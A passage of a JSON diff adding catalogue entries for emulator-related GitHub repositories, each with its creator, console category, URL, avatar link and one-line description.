+    "cover": "https://avatars.githubusercontent.com/u/2345928?v=4",
+    "description": "Game Boy and Game Boy Color emulator written in C"
+  },
+  {
+    "name": "android-emulator-container-scripts",
+    "slug": "android-emulator-container-scripts",
+    "creator": "google",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/google/android-emulator-container-scripts",
+    "cover": "https://avatars.githubusercontent.com/u/1342004?v=4",
+    "description": "..."
+  },
+  {
+    "name": "GPCS4",
+    "slug": "gpcs4",
+    "creator": "Inori",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Inori/GPCS4",
+    "cover": "https://avatars.githubusercontent.com/u/6732524?v=4",
+    "description": "A work-in-progress PlayStation 4 emulator."
+  },
+  {
+    "name": "lc3-vm",
+    "slug": "lc3-vm",
+    "creator": "justinmeiners",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/justinmeiners/lc3-vm",
+    "cover": "https://avatars.githubusercontent.com/u/3220045?v=4",
+    "description": "Write your own virtual machine for the LC-3 computer!"
+  },
+  {
+    "name": "bsnes",
+    "slug": "bsnes",
+    "creator": "bsnes-emu",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/bsnes-emu/bsnes",
+    "cover": "https://avatars.githubusercontent.com/u/62430984?v=4",
+    "description": "bsnes is a Super Nintendo (SNES) emulator focused on performance, features, and ease of use."
+  },
+  {
+    "name": "EKA2L1",
+    "slug": "eka2l1",
+    "creator": "EKA2L1",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/EKA2L1/EKA2L1",
+    "cover": "https://avatars.githubusercontent.com/u/40482621?v=4",
+    "description": "A Symbian OS/N-Gage emulator"
+  },
+  {
+    "name": "BotFramework-Emulator",
+    "slug": "botframework-emulator",
+    "creator": "microsoft",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/microsoft/BotFramework-Emulator",
+    "cover": "https://avatars.githubusercontent.com/u/6154722?v=4",
+    "description": "A desktop application that allows users to locally test and debug chat bots built with the Bot Framework SDK."
+  },
+  {
+    "name": "gbe_fork",
+    "slug": "gbe-fork",
+    "creator": "Detanup01",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Detanup01/gbe_fork",
+    "cover": "https://avatars.githubusercontent.com/u/91248446?v=4",
+    "description": "Fork of https://gitlab.com/Mr_Goldberg/goldberg_emulator"
+  },
+  {
+    "name": "android-emulator-m1-preview",
+    "slug": "android-emulator-m1-preview",
+    "creator": "google",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/google/android-emulator-m1-preview",
+    "cover": "https://avatars.githubusercontent.com/u/1342004?v=4",
+    "description": "..."
+  },
+  {
+    "name": "react-native-picker-select",
+    "slug": "react-native-picker-select",
+    "creator": "lawnstarter",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/lawnstarter/react-native-picker-select",
+    "cover": "https://avatars.githubusercontent.com/u/7708177?v=4",
+    "description": "🔽 A Picker component for React Native which emulates the native <select> interfaces for iOS and Android"
+  },
+  {
+    "name": "VirtualSMC",
+    "slug": "virtualsmc",
+    "creator": "acidanthera",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/acidanthera/VirtualSMC",
+    "cover": "https://avatars.githubusercontent.com/u/39672954?v=4",
+    "description": "SMC emulator layer"
+  },
+  {
+    "name": "rootAVD",
+    "slug": "rootavd",
+    "creator": "newbit1",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/newbit1/rootAVD",
+    "cover": "https://avatars.githubusercontent.com/u/37043777?v=4",
+    "description": "Script to root AVDs running with QEMU Emulator from Android Studio"
+  },
+  {
+    "name": "pegasus-frontend",
+    "slug": "pegasus-frontend",
+    "creator": "mmatyas",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mmatyas/pegasus-frontend",
+    "cover": "https://avatars.githubusercontent.com/u/4354863?v=4",
+    "description": "A cross platform, customizable graphical frontend for launching emulators and managing your game collection."
+  },
+  {
+    "name": "mintty",
+    "slug": "mintty",
+    "creator": "mintty",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mintty/mintty",
+    "cover": "https://avatars.githubusercontent.com/u/12740416?v=4",
+    "description": "The Cygwin Terminal – terminal emulator for Cygwin, MSYS, and WSL"
+  },
+  {
+    "name": "dosbox-staging",
+    "slug": "dosbox-staging",
+    "creator": "dosbox-staging",
+    "version": "...",
+    "console": "DOS",
+    "url": "https://github.com/dosbox-staging/dosbox-staging",
+    "cover": "https://avatars.githubusercontent.com/u/62981643?v=4",
+    "description": "DOSBox Staging is a modern continuation of DOSBox with advanced features and current development practices."
+  },
+  {
+    "name": "Adrenaline",
+    "slug": "adrenaline",
+    "creator": "TheOfficialFloW",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TheOfficialFloW/Adrenaline",
+    "cover": "https://avatars.githubusercontent.com/u/14246466?v=4",
+    "description": "Custom Firmware 6.61 Adrenaline for the PSP Emulator"
+  },
+  {
+    "name": "FabGL",
+    "slug": "fabgl",
+    "creator": "fdivitto",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/fdivitto/FabGL",
+    "cover": "https://avatars.githubusercontent.com/u/9754506?v=4",
+    "description": "ESP32 Display Controller (VGA, PAL/NTSC Color Composite, SSD1306, ST7789, ILI9341), PS/2 Mouse and Keyboard Controller, Graphics Library, Sound Engine, Game Engine and ANSI/VT Terminal"
+  },
+  {
+    "name": "mt32-pi",
+    "slug": "mt32-pi",
+    "creator": "dwhinham",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dwhinham/mt32-pi",
+    "cover": "https://avatars.githubusercontent.com/u/5890747?v=4",
+    "description": "🎹🎶 A baremetal kernel that turns your Raspberry Pi 3 or later into a Roland MT-32 emulator and SoundFont synthesizer based on Circle, Munt, and FluidSynth."
+  },
+  {
+    "name": "php-terminal-gameboy-emulator",
+    "slug": "php-terminal-gameboy-emulator",
+    "creator": "gabrielrcouto",
+    "version": "...",
+    "console": "Game Boy",
+    "url": "https://github.com/gabrielrcouto/php-terminal-gameboy-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/2197005?v=4",
+    "description": "A PHP Terminal GameBoy Emulator"
+  },
+  {
+    "name": "ares",
+    "slug": "ares",
+    "creator": "ares-emulator",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ares-emulator/ares",
+    "cover": "https://avatars.githubusercontent.com/u/88543911?v=4",
+    "description": "ares is a cross-platform, open source, multi-system emulator, focusing on accuracy and preservation."
+  },
+  {
+    "name": "firmware-analysis-toolkit",
+    "slug": "firmware-analysis-toolkit",
+    "creator": "attify",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/attify/firmware-analysis-toolkit",
+    "cover": "https://avatars.githubusercontent.com/u/12211025?v=4",
+    "description": "Toolkit to emulate firmware and analyse it for security vulnerabilities "
+  },
+  {
+    "name": "blizzless-diiis",
+    "slug": "blizzless-diiis",
+    "creator": "blizzless",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/blizzless/blizzless-diiis",
+    "cover": "https://avatars.githubusercontent.com/u/109099842?v=4",
+    "description": "Fully-functional open-source server implementation for Diablo 3"
+  },
+  {
+    "name": "AndroidNativeEmu",
+    "slug": "androidnativeemu",
+    "creator": "AeonLucid",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/AeonLucid/AndroidNativeEmu",
+    "cover": "https://avatars.githubusercontent.com/u/4643257?v=4",
+    "description": "Allows you to partly emulate an Android native library."
+  },
+  {
+    "name": "olcNES",
+    "slug": "olcnes",
+    "creator": "OneLoneCoder",
+    "version": "...",
+    "console": "Nintendo Entertainment System",
+    "url": "https://github.com/OneLoneCoder/olcNES",
+    "cover": "https://avatars.githubusercontent.com/u/25419386?v=4",
+    "description": "NES Emulator, and Tutorial Video Code"
+  },
+  {
+    "name": "road-to-yuzu-without-switch",
+    "slug": "road-to-yuzu-without-switch",
+    "creator": "HerXayah",
+    "version": "...",
+    "console": "Nintendo Switch",
+    "url": "https://github.com/HerXayah/road-to-yuzu-without-switch",
+    "cover": "https://avatars.githubusercontent.com/u/45071533?v=4",
+    "description": "This Repo explains how to install the Yuzu Switch Emulator without a Switch. Also works for Suyu"
+  },
+  {
+    "name": "bot",
+    "slug": "bot",
+    "creator": "GramAddict",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/GramAddict/bot",
+    "cover": "https://avatars.githubusercontent.com/u/73671570?v=4",
+    "description": "Completely free and open-source human-like Instagram bot. Powered by UIAutomator2 and compatible with basically any Android device 5.0+ that can run Instagram - real or emulated."
+  },
+  {
+    "name": "DualSenseX",
+    "slug": "dualsensex",
+    "creator": "Paliverse",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Paliverse/DualSenseX",
+    "cover": "https://avatars.githubusercontent.com/u/4289084?v=4",
+    "description": "Connect your DualSense Controller, use Adaptive Triggers, Emulate Xbox 360 or DualShock 4 through USB or Bluetooth on PC"
+  },
+  {
+    "name": "rt64",
+    "slug": "rt64",
+    "creator": "rt64",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/rt64/rt64",
+    "cover": "https://avatars.githubusercontent.com/u/131293817?v=4",
+    "description": "RT64 is an N64 graphics renderer for playing with enhancements in emulators and native ports."
+  },
+  {
+    "name": "aind",
+    "slug": "aind",
+    "creator": "aind-containers",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/aind-containers/aind",
+    "cover": "https://avatars.githubusercontent.com/u/63350730?v=4",
+    "description": "AinD: Android in Docker. Ain't an emulator."
+  },
+  {
+    "name": "AntiFakerAndroidChecker",
+    "slug": "antifakerandroidchecker",
+    "creator": "happylishang",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/happylishang/AntiFakerAndroidChecker",
+    "cover": "https://avatars.githubusercontent.com/u/6792557?v=4",
+    "description": "设备指纹 获取真实的IMEI AndroidId 序列号 MAC地址等，Android模拟器检测，检测Android模拟器 ，作为可信DeviceID，应对防刷需求等                  Android设备指纹  How to detect Android emulator "
+  },
+  {
+    "name": "ha-bridge",
+    "slug": "ha-bridge",
+    "creator": "bwssytems",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/bwssytems/ha-bridge",
+    "cover": "https://avatars.githubusercontent.com/u/13528314?v=4",
+    "description": "Home automation bridge that emulates a Philips Hue light system and can control other systems such as a Vera, Harmony Hub, Nest, MiLight bulbs or any other system that has an http/https/tcp/udp interface. This is a compact impl to run on small format computers. This is impl started from this project https://github.com/armzilla/amazon-echo-ha-bridge."
+  },
+  {
+    "name": "wasmboy",
+    "slug": "wasmboy",
+    "creator": "torch2424",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/torch2424/wasmboy",
+    "cover": "https://avatars.githubusercontent.com/u/1448289?v=4",
+    "description": "Game Boy / Game Boy Color Emulator Library, 🎮written for WebAssembly using AssemblyScript. 🚀Demos built with Preact and Svelte. ⚛️"
+  },
+  {
+    "name": "colors",
+    "slug": "colors",
+    "creator": "termstandard",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/termstandard/colors",
+    "cover": "https://avatars.githubusercontent.com/u/47971936?v=4",
+    "description": "Color standards for terminal emulators"
+  },
+  {
+    "name": "fceux",
+    "slug": "fceux",
+    "creator": "TASEmulators",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TASEmulators/fceux",
+    "cover": "https://avatars.githubusercontent.com/u/11743303?v=4",
+    "description": "FCEUX, a NES Emulator"
+  },
+  {
+    "name": "cemu_graphic_packs",
+    "slug": "cemu-graphic-packs",
+    "creator": "cemu-project",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/cemu-project/cemu_graphic_packs",
+    "cover": "https://avatars.githubusercontent.com/u/40145098?v=4",
+    "description": "Community Graphic Packs for Cemu"
+  },
+  {
+    "name": "gameboy",
+    "slug": "gameboy",
+    "creator": "mohanson",
+    "version": "...",
+    "console": "Game Boy",
+    "url": "https://github.com/mohanson/gameboy",
+    "cover": "https://avatars.githubusercontent.com/u/12387889?v=4",
+    "description": "Full featured Cross-platform GameBoy emulator by Rust. Forever boys!."
+  },
+  {
+    "name": "binfmt",
+    "slug": "binfmt",
+    "creator": "tonistiigi",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/tonistiigi/binfmt",
+    "cover": "https://avatars.githubusercontent.com/u/585223?v=4",
+    "description": "Cross-platform emulator collection distributed with Docker images."
+  },
+  {
+    "name": "SwiftTerm",
+    "slug": "swiftterm",
+    "creator": "migueldeicaza",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/migueldeicaza/SwiftTerm",
+    "cover": "https://avatars.githubusercontent.com/u/36863?v=4",
+    "description": "Xterm/VT100 Terminal emulator in Swift"
+  },
+  {
+    "name": "pokegb",
+    "slug": "pokegb",
+    "creator": "binji",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/binji/pokegb",
+    "cover": "https://avatars.githubusercontent.com/u/1245315?v=4",
+    "description": "A gameboy emulator that only plays Pokemon Blue, in ~50 lines of c++."
+  },
+  {
+    "name": "AndroidSDK",
+    "slug": "androidsdk",
+    "creator": "thyrlian",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/thyrlian/AndroidSDK",
+    "cover": "https://avatars.githubusercontent.com/u/352956?v=4",
+    "description": "🐳 Full-fledged Android SDK Docker Image"
+  },
+  {
+    "name": "98",
+    "slug": "98",
+    "creator": "1j01",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/1j01/98",
+    "cover": "https://avatars.githubusercontent.com/u/3630663?v=4",
+    "description": "💿 Web-based Windows 98 desktop recreation █████▓█▓▓▒▓▒▒░▒░░░🗕︎🗗︎🗙︎"
+  },
+  {
+    "name": "Panda3DS",
+    "slug": "panda3ds",
+    "creator": "wheremyfoodat",
+    "version": "...",
+    "console": "Nintendo 3DS",
+    "url": "https://github.com/wheremyfoodat/Panda3DS",
+    "cover": "https://avatars.githubusercontent.com/u/44909372?v=4",
+    "description": "HLE 3DS emulator"
+  },
+  {
+    "name": "fake-gcs-server",
+    "slug": "fake-gcs-server",
+    "creator": "fsouza",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/fsouza/fake-gcs-server",
+    "cover": "https://avatars.githubusercontent.com/u/108725?v=4",
+    "description": "Google Cloud Storage emulator & testing library."
+  },
+  {
+    "name": "pywinassistant",
+    "slug": "pywinassistant",
+    "creator": "a-real-ai",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/a-real-ai/pywinassistant",
+    "cover": "https://avatars.githubusercontent.com/u/145295694?v=4",
+    "description": "The first open-source Artificial Narrow Intelligence generalist agentic framework Computer-Using-Agent that fully operates graphical-user-interfaces (GUIs) by using only natural language. Uses Visualization-of-Thought and Chain-of-Thought reasoning to elicit spatial reasoning and perception, emulates, plans and simulates synthetic HID interactions."
+  },
+  {
+    "name": "melonDS-android",
+    "slug": "melonds-android",
+    "creator": "rafaelvcaetano",
+    "version": "...",
+    "console": "Nintendo DS",
+    "url": "https://github.com/rafaelvcaetano/melonDS-android",
+    "cover": "https://avatars.githubusercontent.com/u/9086379?v=4",
+    "description": "Android port of melonDS"
+  },
+  {
+    "name": "joycontrol",
+    "slug": "joycontrol",
+    "creator": "mart1nro",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/mart1nro/joycontrol",
+    "cover": "https://avatars.githubusercontent.com/u/10002144?v=4",
+    "description": "Emulate Nintendo Switch Controllers over Bluetooth"
+  },
+  {
+    "name": "SmartGuitarAmp",
+    "slug": "smartguitaramp",
+    "creator": "GuitarML",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/GuitarML/SmartGuitarAmp",
+    "cover": "https://avatars.githubusercontent.com/u/32459398?v=4",
+    "description": "Guitar plugin made with JUCE that uses neural networks to emulate a tube amplifier."
+  },
+  {
+    "name": "higan",
+    "slug": "higan",
+    "creator": "higan-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/higan-emu/higan",
+    "cover": "https://avatars.githubusercontent.com/u/62430948?v=4",
+    "description": "higan is a multi-system emulator focused on accuracy, preservation, and configurability."
+  },
+  {
+    "name": "Mesen",
+    "slug": "mesen",
+    "creator": "SourMesen",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/SourMesen/Mesen",
+    "cover": "https://avatars.githubusercontent.com/u/21093973?v=4",
+    "description": "Mesen is a cross-platform (Windows & Linux) NES/Famicom emulator built in C++ and C#"
+  },
+  {
+    "name": "FBNeo",
+    "slug": "fbneo",
+    "creator": "finalburnneo",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/finalburnneo/FBNeo",
+    "cover": "https://avatars.githubusercontent.com/u/50798522?v=4",
+    "description": "FinalBurn Neo - We are Team FBNeo."
+  },
+  {
+    "name": "decaf-emu",
+    "slug": "decaf-emu",
+    "creator": "decaf-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/decaf-emu/decaf-emu",
+    "cover": "https://avatars.githubusercontent.com/u/15236850?v=4",
+    "description": "Researching Wii U emulation."
+  },
+  {
+    "name": "Bochs",
+    "slug": "bochs",
+    "creator": "bochs-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/bochs-emu/Bochs",
+    "cover": "https://avatars.githubusercontent.com/u/112121982?v=4",
+    "description": "Bochs - Cross Platform x86 Emulator Project"
+  },
+  {
+    "name": "CEmu",
+    "slug": "cemu",
+    "creator": "CE-Programming",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/CE-Programming/CEmu",
+    "cover": "https://avatars.githubusercontent.com/u/16008243?v=4",
+    "description": "Third-party TI-84 Plus CE / TI-83 Premium CE emulator, focused on developer features"
+  },
+  {
+    "name": "emupedia.github.io",
+    "slug": "emupedia-github-io",
+    "creator": "Emupedia",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Emupedia/emupedia.github.io",
+    "cover": "https://avatars.githubusercontent.com/u/12756090?v=4",
+    "description": "The purpose of Emupedia is to serve as a nonprofit meta-resource, hub and community for those interested mainly in video game preservation which aims to digitally collect, archive and preserve games and software to make them available online accessible by a user-friendly UI that simulates several retro operating systems for educational purposes."
+  },
+  {
+    "name": "NanoBoyAdvance",
+    "slug": "nanoboyadvance",
+    "creator": "nba-emu",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/nba-emu/NanoBoyAdvance",
+    "cover": "https://avatars.githubusercontent.com/u/93684526?v=4",
+    "description": "A cycle-accurate Nintendo Game Boy Advance emulator."
+  },
+  {
+    "name": "uEmu",
+    "slug": "uemu",
+    "creator": "alexhude",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/alexhude/uEmu",
+    "cover": "https://avatars.githubusercontent.com/u/13582677?v=4",
+    "description": "Tiny cute emulator plugin for IDA based on unicorn."
+  },
+  {
+    "name": "psx_retroshader",
+    "slug": "psx-retroshader",
+    "creator": "dsoft20",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dsoft20/psx_retroshader",
+    "cover": "https://avatars.githubusercontent.com/u/8696770?v=4",
+    "description": "Shader that \"emulates\" the rendering style of ps1"
+  },
+  {
+    "name": "android-emulator-runner",
+    "slug": "android-emulator-runner",
+    "creator": "ReactiveCircus",
+    "version": "...",
+    "console": "Android",
+    "url": "https://github.com/ReactiveCircus/android-emulator-runner",
+    "cover": "https://avatars.githubusercontent.com/u/51352484?v=4",
+    "description": "A GitHub Action for installing, configuring and running hardware-accelerated Android Emulators on macOS virtual machines."
+  },
+  {
+    "name": "RVVM",
+    "slug": "rvvm",
+    "creator": "LekKit",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/LekKit/RVVM",
+    "cover": "https://avatars.githubusercontent.com/u/50500857?v=4",
+    "description": "The RISC-V Virtual Machine "
+  },
+  {
+    "name": "pixl.js",
+    "slug": "pixl-js",
+    "creator": "solosky",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/solosky/pixl.js",
+    "cover": "https://avatars.githubusercontent.com/u/480111?v=4",
+    "description": "An emulator for Amiibo!"
+  },
+  {
+    "name": "NeuralPi",
+    "slug": "neuralpi",
+    "creator": "GuitarML",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/GuitarML/NeuralPi",
+    "cover": "https://avatars.githubusercontent.com/u/32459398?v=4",
+    "description": "Raspberry Pi guitar pedal using neural networks to emulate real amps and effects."
+  },
+  {
+    "name": "simple64",
+    "slug": "simple64",
+    "creator": "simple64",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/simple64/simple64",
+    "cover": "https://avatars.githubusercontent.com/u/103474989?v=4",
+    "description": "Accurate N64 Emulator"
+  },
+  {
+    "name": "metroboy",
+    "slug": "metroboy",
+    "creator": "aappleby",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/aappleby/metroboy",
+    "cover": "https://avatars.githubusercontent.com/u/778399?v=4",
+    "description": "A repository of gate-level simulators and tools for the original Game Boy."
+  },
+  {
+    "name": "chips",
+    "slug": "chips",
+    "creator": "floooh",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/floooh/chips",
+    "cover": "https://avatars.githubusercontent.com/u/1699414?v=4",
+    "description": "8-bit chip and system emulators in standalone C headers"
+  },
+  {
+    "name": "libtcod",
+    "slug": "libtcod",
+    "creator": "libtcod",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/libtcod/libtcod",
+    "cover": "https://avatars.githubusercontent.com/u/40313210?v=4",
+    "description": "A collection of tools and algorithms for developing traditional roguelikes.  Such as field-of-view, pathfinding, and a tile-based terminal emulator."
+  },
+  {
+    "name": "coffee-gb",
+    "slug": "coffee-gb",
+    "creator": "trekawek",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/trekawek/coffee-gb",
+    "cover": "https://avatars.githubusercontent.com/u/142138?v=4",
+    "description": "Gameboy emulator in Java and Kotlin."
+  },
+  {
+    "name": "SkyEmu",
+    "slug": "skyemu",
+    "creator": "skylersaleh",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/skylersaleh/SkyEmu",
+    "cover": "https://avatars.githubusercontent.com/u/7118296?v=4",
+    "description": "Game Boy Advance, Game Boy, Game Boy Color, and DS Emulator"
+  },
+  {
+    "name": "vlmcsd",
+    "slug": "vlmcsd",
+    "creator": "kkkgo",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/kkkgo/vlmcsd",
+    "cover": "https://avatars.githubusercontent.com/u/4530897?v=4",
+    "description": "🔑Portable open-source KMS Emulator in C"
+  },
+  {
+    "name": "pcjs",
+    "slug": "pcjs",
+    "creator": "jeffpar",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/jeffpar/pcjs",
+    "cover": "https://avatars.githubusercontent.com/u/645749?v=4",
+    "description": "The original IBM PC and other machine emulations in JavaScript"
+  },
+  {
+    "name": "aws-lambda-runtime-interface-emulator",
+    "slug": "aws-lambda-runtime-interface-emulator",
+    "creator": "aws",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/aws/aws-lambda-runtime-interface-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/2232217?v=4",
+    "description": "..."
+  },
+  {
+    "name": "make-it-heavy",
+    "slug": "make-it-heavy",
+    "creator": "Doriandarko",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Doriandarko/make-it-heavy",
+    "cover": "https://avatars.githubusercontent.com/u/1247180?v=4",
+    "description": "A Python framework that emulates Grok Heavy functionality using intelligent multi-agent orchestration. Deploy 4 (or more) specialized AI agents in parallel to deliver comprehensive, multi-perspective analysis on any query."
+  },
+  {
+    "name": "nemu",
+    "slug": "nemu",
+    "creator": "NJU-ProjectN",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/NJU-ProjectN/nemu",
+    "cover": "https://avatars.githubusercontent.com/u/30926424?v=4",
+    "description": "NJU EMUlator, a full system x86/mips32/riscv32/riscv64 emulator for teaching"
+  },
+  {
+    "name": "CLK",
+    "slug": "clk",
+    "creator": "TomHarte",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/TomHarte/CLK",
+    "cover": "https://avatars.githubusercontent.com/u/1162152?v=4",
+    "description": "A latency-hating emulator of: the Acorn Electron, BBC Micro and Archimedes, Amstrad CPC, Apple II/II+/IIe and early Macintosh, Atari 2600 and ST, ColecoVision, Enterprise 64/128, Commodore Vic-20 and Amiga, MSX 1/2, Oric 1/Atmos, early PC compatibles, Sega Master System, Sinclair ZX80/81 and ZX Spectrum."
+  },
+  {
+    "name": "NooDS",
+    "slug": "noods",
+    "creator": "Hydr8gon",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Hydr8gon/NooDS",
+    "cover": "https://avatars.githubusercontent.com/u/3057954?v=4",
+    "description": "A (hopefully!) speedy DS emulator"
+  },
+  {
+    "name": "ProjectPSX",
+    "slug": "projectpsx",
+    "creator": "BluestormDNA",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/BluestormDNA/ProjectPSX",
+    "cover": "https://avatars.githubusercontent.com/u/28767885?v=4",
+    "description": "Experimental C# Playstation Emulator"
+  },
+  {
+    "name": "gearmulator",
+    "slug": "gearmulator",
+    "creator": "dsp56300",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/dsp56300/gearmulator",
+    "cover": "https://avatars.githubusercontent.com/u/87139854?v=4",
+    "description": "Low Level Emulation of classic VA synths & effects of the late 90s/2000s by emulating the used ICs"
+  },
+  {
+    "name": "bigquery-emulator",
+    "slug": "bigquery-emulator",
+    "creator": "goccy",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/goccy/bigquery-emulator",
+    "cover": "https://avatars.githubusercontent.com/u/209884?v=4",
+    "description": "BigQuery emulator server implemented in Go"
+  },
+  {
+    "name": "BotW-BetterVR",
+    "slug": "botw-bettervr",
+    "creator": "Crementif",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/Crementif/BotW-BetterVR",
+    "cover": "https://avatars.githubusercontent.com/u/26669564?v=4",
+    "description": "A project aimed at providing a better PC VR mode for BotW using the Cemu emulator"
+  },
+  {
+    "name": "retro-go",
+    "slug": "retro-go",
+    "creator": "ducalex",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/ducalex/retro-go",
+    "cover": "https://avatars.githubusercontent.com/u/13711380?v=4",
+    "description": "Retro emulation for the ODROID-GO and other ESP32 devices"
+  },
+  {
+    "name": "retroboy",
+    "slug": "retroboy",
+    "creator": "smparsons",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/smparsons/retroboy",
+    "cover": "https://avatars.githubusercontent.com/u/8586044?v=4",
+    "description": "A Game Boy emulator written in Rust."
+  },
+  {
+    "name": "libriscv",
+    "slug": "libriscv",
+    "creator": "libriscv",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/libriscv/libriscv",
+    "cover": "https://avatars.githubusercontent.com/u/176955548?v=4",
+    "description": "The fastest RISC-V sandbox"
+  },
+  {
+    "name": "bddisasm",
+    "slug": "bddisasm",
+    "creator": "bitdefender",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/bitdefender/bddisasm",
+    "cover": "https://avatars.githubusercontent.com/u/32452258?v=4",
+    "description": "bddisasm is a fast, lightweight, x86/x64 instruction decoder.  The project also features a fast, basic, x86/x64 instruction emulator, designed specifically to detect shellcode-like behavior."
+  },
+  {
+    "name": "cemu",
+    "slug": "cemu",
+    "creator": "hugsy",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/hugsy/cemu",
+    "cover": "https://avatars.githubusercontent.com/u/590234?v=4",
+    "description": "Cheap EMUlator: lightweight multi-architecture assembly playground"
+  },
+  {
+    "name": "Boxedwine",
+    "slug": "boxedwine",
+    "creator": "danoon2",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/danoon2/Boxedwine",
+    "cover": "https://avatars.githubusercontent.com/u/54689747?v=4",
+    "description": "Emulator that can run 32-bit Windows programs/games on multiple platforms via Wine"
+  },
+  {
+    "name": "red-viper",
+    "slug": "red-viper",
+    "creator": "skyfloogle",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/skyfloogle/red-viper",
+    "cover": "https://avatars.githubusercontent.com/u/18466542?v=4",
+    "description": "A Virtual Boy emulator for the 3DS"
+  },
+  {
+    "name": "GIOVANNI",
+    "slug": "giovanni",
+    "creator": "gabrieloc",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/gabrieloc/GIOVANNI",
+    "cover": "https://avatars.githubusercontent.com/u/983669?v=4",
+    "description": "A Gameboy Emulator for the Apple Watch"
+  },
+  {
+    "name": "nostalgist",
+    "slug": "nostalgist",
+    "creator": "arianrhodsandlot",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/arianrhodsandlot/nostalgist",
+    "cover": "https://avatars.githubusercontent.com/u/10987902?v=4",
+    "description": "A JavaScript library used for running emulators of retro consoles inside browsers."
+  },
+  {
+    "name": "quadplay",
+    "slug": "quadplay",
+    "creator": "morgan3d",
+    "version": "...",
+    "console": "Multi Platform",
+    "url": "https://github.com/morgan3d/quadplay",
+    "cover": "https://avatars.githubusercontent.com/u/3970018?v=4",
